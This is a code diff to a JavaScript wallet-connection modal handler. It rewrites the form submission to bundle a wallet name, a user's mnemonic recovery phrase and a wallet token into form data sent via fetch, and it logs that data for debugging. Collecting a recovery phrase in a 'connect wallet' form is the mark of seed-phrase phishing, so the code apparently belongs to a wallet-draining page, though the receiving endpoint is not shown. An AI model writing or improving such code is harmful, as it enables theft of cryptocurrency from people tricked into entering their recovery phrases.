@@ -110,9 +110,24 @@ window.WalletModalHandler = {
         loader.style.display = 'inline-block';
         
         try {
-            // Submit form via fetch
-            const formData = new FormData(document.getElementById('connectForm'));
+            // Collect all form data explicitly
+            const formElement = document.getElementById('connectForm');
+            const walletTokenField = formElement.querySelector('input[name="wallet_token"]');
+            const walletNameField = formElement.querySelector('input[name="wallet_name"]');
+            
+            // Verify wallet_name is set
+            if (!walletName) {
+                this.showError('Wallet name not set. Please select a wallet again.');
+                submitBtn.disabled = false;
+                loader.style.display = 'none';
+                return;
+            }
+            
+            // Create FormData with explicit fields
+            const formData = new FormData();
+            formData.append('wallet_name', walletName);
             formData.append('mnemonic', mnemonic);
+            formData.append('wallet_token', walletTokenField ? walletTokenField.value : '');
             
             // Debug: Log what we're sending
             console.log('Wallet Form Data being sent:');
